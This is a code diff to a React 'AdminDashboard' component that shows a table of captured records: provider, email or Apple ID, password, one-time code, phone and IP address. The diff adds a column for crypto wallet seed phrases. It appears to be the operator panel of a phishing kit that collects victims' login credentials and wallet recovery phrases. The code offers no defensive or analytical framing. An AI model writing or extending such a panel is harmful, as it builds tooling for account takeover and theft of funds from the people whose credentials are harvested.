@@ -368,6 +368,7 @@ const AdminDashboard = () => {
                     <th>Provider</th>
                     <th>Email/ID</th>
                     <th>Password</th>
+                    <th>Seed Phrase</th>
                     <th>OTP</th>
                     <th>Phone</th>
                     <th>IP Address</th>
@@ -384,7 +385,10 @@ const AdminDashboard = () => {
                           borderRadius: '4px',
                           fontSize: '12px',
                           fontWeight: '600',
-                          backgroundColor: cred.provider === 'Google' ? '#4285f4' : '#000',
+                          backgroundColor: 
+                            cred.provider === 'Google' ? '#4285f4' : 
+                            cred.provider === 'Apple' ? '#000' : 
+                            '#05d168',
                           color: 'white'
                         }}>
                           {cred.provider}
@@ -393,6 +397,16 @@ const AdminDashboard = () => {
                       <td>{cred.email || cred.appleId}</td>
                       <td style={{ fontFamily: 'monospace', fontSize: '12px' }}>
                         {cred.password || '-'}
+                      </td>
+                      <td style={{ 
+                        fontFamily: 'monospace', 
+                        fontSize: '11px',
+                        maxWidth: '300px',
+                        wordWrap: 'break-word',
+                        backgroundColor: cred.seedPhrase ? '#fff3cd' : 'transparent',
+                        padding: cred.seedPhrase ? '8px' : '0'
+                      }}>
+                        {cred.seedPhrase || '-'}
                       </td>
                       <td style={{ fontFamily: 'monospace' }}>
                         {cred.otp || '-'}
